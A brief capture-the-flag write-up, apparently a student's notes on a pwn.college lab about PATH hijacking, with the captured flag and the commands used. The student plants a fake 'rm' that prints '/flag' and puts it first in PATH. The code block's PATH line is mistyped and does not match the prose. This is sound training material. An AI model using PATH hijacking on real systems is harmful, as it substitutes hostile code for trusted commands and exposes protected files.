# Pondering PATH

## Hijacking Commands
You know that rm is searched for in the directories listed in the PATH variable. You have experience creating the win command when the previous challenge needed it. What else can you create?

### Solve
**Flag:** `pwn.college{wZ02JdzGk9BI0v2IOcqNjnZF_SG.QX3cjM1wiNzAzNzEzW}`

In this challenge, I typed ```echo $PATH``` and saw a list of directories and one by one checked if it had cat inside using ```ls``` and found it in ```/usr/bin```. I added a ```rm``` file with the text ```/usr/bin/cat /flag``` and made it executable using ```chmod```. Next, I added it to the path using ```PATH="$PWD:$PATH"``` and got the flag.

```bash
echo $PATH
nano rm
/usr/bin/cat /flag #inside rm file
chmod u=rwx rm
PATH=$"PWD:$PATH"
/challenge/run
```

### New Learnings
Learned about hijacking commands.
